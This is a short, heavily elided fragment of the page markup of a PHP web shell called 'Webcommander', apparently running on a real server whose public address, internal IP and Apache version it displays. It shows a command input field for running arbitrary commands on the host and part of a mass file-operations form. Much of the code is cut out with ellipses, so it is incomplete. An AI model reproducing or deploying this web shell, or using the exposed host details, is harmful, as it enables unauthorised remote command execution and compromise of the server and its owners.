...
?>
 ...
 //--></style>
 <title>Webcommander at 132.232.103.235:8081</title>
 </head>
 <body>
<?
...
?>
 <table class=e>
  <tr>
   <td rowspan=3><img src=?act=showlogo></td>
   <td><b>Host:</b></td><td class=v>132.232.103.235:8081</td>
  </tr>
  <tr>
   <td><b>IP address:</b></td><td class=v>172.17.0.2</td>
  </tr>
  <tr>
   <td><b>Software:</b></td><td class=v>Apache/2.4.56 (Debian)</td>
  </tr>
 </table>
 <form action= method=GET>
 <b>Команда:</b> <input type=text name=cmd value="" size=120>
...
?>
 <form action=?act=mass method=POST>
 <table width=700>
 <tr class=e><td colspan=7><b></b></td></tr>
 <tr class=h><td><a href="?dir="><<</a></td>
